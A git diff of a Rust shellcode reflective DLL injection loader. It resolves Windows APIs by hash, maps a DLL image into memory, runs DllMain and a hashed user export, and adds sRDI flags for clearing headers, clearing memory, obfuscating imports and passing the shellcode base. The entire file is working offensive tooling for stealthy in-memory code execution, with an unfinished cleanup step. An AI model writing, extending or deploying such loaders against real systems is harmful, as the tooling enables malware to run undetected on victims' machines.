@@ -1,6 +1,6 @@
 use std::{arch::asm, mem::size_of, ffi::c_void};
 use ntapi::{ntpebteb::PTEB, ntpsapi::PEB_LDR_DATA, ntldr::LDR_DATA_TABLE_ENTRY};
-use windows_sys::{Win32::{Foundation::{HANDLE, HINSTANCE, FARPROC, BOOL}, System::{Memory::{VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, PAGE_WRITECOPY, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEM_COMMIT, VIRTUAL_FREE_TYPE}, SystemServices::{IMAGE_DOS_HEADER, DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_IMPORT_BY_NAME, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_EXECUTE, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, WindowsProgramming::IMAGE_THUNK_DATA64}}, core::PCSTR};
+use windows_sys::{Win32::{Foundation::{HANDLE, HINSTANCE, FARPROC, BOOL}, System::{Memory::{VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, PAGE_WRITECOPY, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEM_COMMIT, VIRTUAL_FREE_TYPE, MEM_RELEASE}, SystemServices::{IMAGE_DOS_HEADER, DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_IMPORT_BY_NAME, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_EXECUTE, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, WindowsProgramming::IMAGE_THUNK_DATA64}}, core::PCSTR};
 
 #[allow(non_camel_case_types)]
 type fnLoadLibraryA = unsafe extern "system" fn(
@@ -79,9 +79,21 @@ const FLUSH_INSTRUCTION_CACHE_HASH: u32 = 0xefb7bf9d;
 const VIRTUAL_FREE_HASH: u32 = 0xe144a60e;
 const EXIT_THREAD_HASH: u32 = 0xc165d757;
 
+#[allow(dead_code)]
+const SRDI_CLEARHEADER: u32 = 0x1;
+
+#[allow(dead_code)]
+const SRDI_CLEARMEMORY: u32 = 0x2;
+
+#[allow(dead_code)]
+const SRDI_OBFUSCATEIMPORTS: u32 = 0x4;
+
+#[allow(dead_code)]
+const SRDI_PASS_SHELLCODE_BASE: u32 = 0x8;
+
 /// Performs a Reflective DLL Injection
 #[no_mangle]
-pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function_hash: u32, user_data: *mut c_void, user_data_length: u32) {
+pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function_hash: u32, user_data: *mut c_void, user_data_length: u32, shellcode_base: *mut c_void, flags: u32) {
 
     let module_base = image_bytes as usize;
 
@@ -186,7 +198,7 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
     unsafe { FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
 
     //
-    // 6) Execute DllMain AND USER_FUNCTION
+    // 6) Execute DllMain
     //
     let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
     
@@ -196,21 +208,39 @@ pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function
     unsafe { DllMain(new_module_base as _, DLL_PROCESS_ATTACH, module_base as _) };
 
 
+    //
+    // 7) Execute USER_FUNCTION
+    //
 
     // Get USER_FUNCTION export by hash
     let user_function_address = unsafe { get_export_by_hash(new_module_base as _, user_function_hash) };
 
     unsafe { USER_FUNCTION = Some(std::mem::transmute::<_, fnUserFunction>(user_function_address)) };
     
-    // Execute user function
-    unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };
+    if flags & SRDI_PASS_SHELLCODE_BASE != 0 {
+        // Execute user function with shellcode base and user data length
+        unsafe { USER_FUNCTION.unwrap()(shellcode_base, user_data_length) };
+    } else {
+        // Execute user function with user data and user data length
+        unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };
+    }
 
+    //
+    // 8) Free memory and exit thread (TODO)
+    //
 
-    // Free the bootstrap shellcode memory (Does not work, maybe because can't free your own shellcode because memory is in use.)
-    //unsafe { VIRTUAL_FREE.unwrap()(bootstrap_shellcode_address as _, 0, MEM_RELEASE) };
-
-    // Exit the thread using the current exit code of the thread (Does not work, not sure why.)
-    //unsafe { EXIT_THREAD.unwrap()(1) };
+    if flags & SRDI_CLEARMEMORY != 0 {
+        unsafe {
+            asm!("nop");
+            asm!("nop");
+            asm!("nop");
+            asm!("nop");
+        }
+        // Freeing the shellcode memory itself will crash the process because you we're not resuming execution flow of the program (ret 2 caller)
+        // unsafe { VIRTUAL_FREE.unwrap()(shellcode_base as _, 0, MEM_RELEASE) };
+        // Exit thread won't work because the memory above will free the RDI itself
+        // unsafe { EXIT_THREAD.unwrap()(1) };
+    }
 }
 
 
